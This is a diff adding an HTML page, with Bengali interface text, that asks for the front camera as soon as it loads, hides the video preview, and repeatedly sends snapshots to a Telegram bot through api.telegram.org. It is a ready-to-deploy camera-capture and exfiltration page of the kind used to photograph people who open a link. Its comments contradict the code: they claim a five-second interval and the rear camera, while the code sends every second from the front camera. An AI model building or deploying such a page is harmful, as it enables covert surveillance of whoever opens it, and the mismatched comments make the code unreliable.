@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Camera to Telegram</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f4f8;
+      text-align: center;
+      padding: 25px;
+      margin: 0;
+    }
+
+    .container {
+      max-width: 520px;
+      margin: auto;
+      background: white;
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px #0002;
+    }
+
+    #status {
+      margin-top: 15px;
+      overflow-wrap: anywhere;
+      font-size: 16px;
+      color: #333;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <h2>Camera → Telegram Bot</h2>
+    <p>প্রতি ৫ সেকেন্ডে একটি ছবি পাঠানো হচ্ছে...</p>
+    <p id="status">ক্যামেরা শুরু হচ্ছে...</p>
+  </div>
+
+  <!-- Hidden video & canvas (no preview) -->
+  <video id="video" autoplay playsinline muted style="display:none;"></video>
+  <canvas id="canvas" hidden></canvas>
+
+  <script>
+    // নিজের Telegram Bot তথ্য বসাও
+    const BOT_TOKEN = "YOUR_BOT_TOKEN";
+    const CHAT_ID = "YOUR_CHAT_ID";
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const statusText = document.getElementById("status");
+
+    let stream = null;
+    let timer = null;
+    let sending = false;
+    let stopped = false;
+
+    async function startCamera() {
+      if (stopped) return;
+
+      try {
+        statusText.textContent = "ক্যামেরার অনুমতি চাওয়া হচ্ছে...";
+
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }, // পিছনের ক্যামেরা প্রাধান্য
+          audio: false
+        });
+
+        video.srcObject = stream;
+        await video.play();
+
+        statusText.textContent = "ক্যামেরা চালু। প্রতি ৫ সেকেন্ডে ছবি পাঠানো হচ্ছে...";
+
+        // প্রথম ছবি পাঠাও
+        await captureAndSend();
+
+        // তারপর প্রতি ৫ সেকেন্ডে
+        if (!stopped) {
+          timer = setInterval(captureAndSend, 1000);
+        }
+
+      } catch (error) {
+        stopped = true;
+        statusText.textContent = "ক্যামেরা চালু হয়নি: " + error.message;
+        stopCamera();
+      }
+    }
+
+    async function captureAndSend() {
+      if (stopped || sending || !video.videoWidth) return;
+
+      sending = true;
+
+      try {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+
+        const blob = await new Promise(resolve =>
+          canvas.toBlob(resolve, "image/jpeg", 0.85)
+        );
+
+        if (!blob) throw new Error("ছবি তৈরি করা যায়নি");
+
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "capture.jpg");
+        formData.append("caption", "Camera capture - " + new Date().toLocaleString());
+
+        const response = await fetch(
+          `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+          {
+            method: "POST",
+            body: formData
+          }
+        );
+
+        const result = await response.json();
+
+        if (!response.ok || !result.ok) {
+          throw new Error(result.description || "Telegram error");
+        }
+
+        statusText.textContent =
+          "ছবি সফলভাবে পাঠানো হয়েছে: " +
+          new Date().toLocaleTimeString();
+
+      } catch (error) {
+        statusText.textContent = "পাঠানো যায়নি: " + error.message;
+      } finally {
+        sending = false;
+      }
+    }
+
+    function stopCamera() {
+      stopped = true;
+      if (timer) {
+        clearInterval(timer);
+        timer = null;
+      }
+
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }
+
+      video.srcObject = null;
+    }
+
+    // পেজ লোড হওয়ার সাথে সাথেই ক্যামেরা শুরু
+    window.addEventListener("load", () => {
+      startCamera();
+    });
+
+    
+  </script>
+</body>
+</html>
